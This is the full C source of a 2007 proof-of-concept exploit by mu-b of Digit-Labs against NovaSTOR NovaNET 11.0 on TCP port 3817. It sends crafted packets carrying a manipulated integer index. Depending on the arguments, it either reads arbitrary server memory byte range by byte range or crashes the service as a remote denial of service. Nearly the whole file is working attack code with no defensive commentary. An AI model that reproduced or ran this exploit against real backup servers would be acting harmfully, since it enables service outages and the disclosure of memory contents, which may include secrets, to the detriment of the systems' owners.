/* novanet-read.c
 *
 * Copyright (c) 2007 by <mu-b@digit-labs.org>
 *
 * NovaSTOR NovaNET remote DoS + arbitrary memory read
 * by mu-b - Fri Sep 14 2007
 *
 * - Tested on: NovaSTOR NovaNET 11.0
 *
 * Note: this was silently fixed in NovaBACKUP NETWORK 13.0
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>

#define BUF_SIZE              0x92

#define NOVANET_INT_IDX       32
#define NOVANET_OFFSET        0x100EC480
#define NOVANET_CALC_INT(a)   (((int) (a)-NOVANET_OFFSET-16)/sizeof (int))
#define NOVANET_SET_INT(a,b)  *((unsigned int *) &a[NOVANET_INT_IDX]) = b;
#define NOVANET_TCP_PORT      3817
#define USLEEP_TIME           100000

static int
sock_send (int fd, char *src, int len)
{
  int n;
  if ((n = send (fd, src, len, 0)) < 0)
    {
      perror ("send()");
      exit (EXIT_FAILURE);
    }

  return (n);
}

static int
sock_recv (int fd, char *dst, int len)
{
  return (recv (fd, dst, len, 0));
}

static int
sockami (char *host, int port)
{
  struct sockaddr_in address;
  struct hostent *hp;
  int fd;

  if ((fd = socket (AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror ("socket()");
      exit (EXIT_FAILURE);
    }

  if ((hp = gethostbyname (host)) == NULL)
    {
      perror ("gethostbyname()");
      exit (EXIT_FAILURE);
    }

  memset (&address, 0, sizeof (address));
  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons (port);

  if (connect (fd, (struct sockaddr *) &address, sizeof (address)) < 0)
    {
      perror ("connect()");
      return (-1);
    }

  return (fd);
}

static void
novanet_pkt_init (char *pkt)
{
  char *ptr = pkt;

  /* add packet header */
  *ptr++ = 0x54;
  *ptr++ = 0x84;

  /* add padding */
  memset (ptr, 0x00, 0x1E);
  ptr   += 0x1E;

  /* add our dodgy-int */
  memset (ptr, 0x69, sizeof (int));
  ptr   += sizeof (int);

  memset (ptr, 0x00, BUF_SIZE-(ptr-pkt));
}

static void
novanet_read (char *host, void *start, void *end, int is_dos)
{
  int sock, i, num_hits;
  char buf[BUF_SIZE], rbuf[BUF_SIZE];

  novanet_pkt_init (buf);

  start = (void *) NOVANET_CALC_INT (start);
  end = (void *) NOVANET_CALC_INT (end);

  if (!is_dos)
    printf ("start: %p end: %p\n", start, end);

  num_hits = is_dos ? 1 : (end - start);
  printf ("+hitting %s:%d. (%d times)\n", host, NOVANET_TCP_PORT, num_hits);

  for (i = 0; i < num_hits; i++, start++)
    {
      sock = sockami (host, NOVANET_TCP_PORT);
      if (sock == -1)
        break;

      NOVANET_SET_INT (buf, (is_dos ? NOVANET_CALC_INT (0xdeadbeef) : (unsigned int) start));
      sock_send (sock, buf, sizeof buf);

      if (!is_dos)
        {
          sock_recv (sock, rbuf, sizeof rbuf);
          write (fileno (stderr), &rbuf[NOVANET_INT_IDX], sizeof (int));
          usleep (USLEEP_TIME);
          close (sock);

          if (!((i + 1) % 8))
            printf ("..%d", i + 1);

          fflush (stdout);
        }
    }

  printf ("\n");
}

int
main (int argc, char **argv)
{
  void *start, *end;

  printf ("NovaSTOR NovaNET remote DoS + arbitrary memory read\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");

  if ((argc % 2) == 1 ||
      (argc > 3 && (sscanf (argv[2], "0x%p", &start) != 1 ||
                    sscanf (argv[3], "0x%p", &end) != 1)))
    {
      fprintf (stderr, "Usage: %s <host> [[start] [end]]\n"
                       "Note: not specifying [[start] [end]] results in DoS!\n\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  if (argc > 3)
    printf ("dumping from: %p -> %p (%d-bytes) to stderr\n", start, end, (int) (end - start));

  novanet_read (argv[1], start, end, !(argc > 3));

  return (EXIT_SUCCESS);
}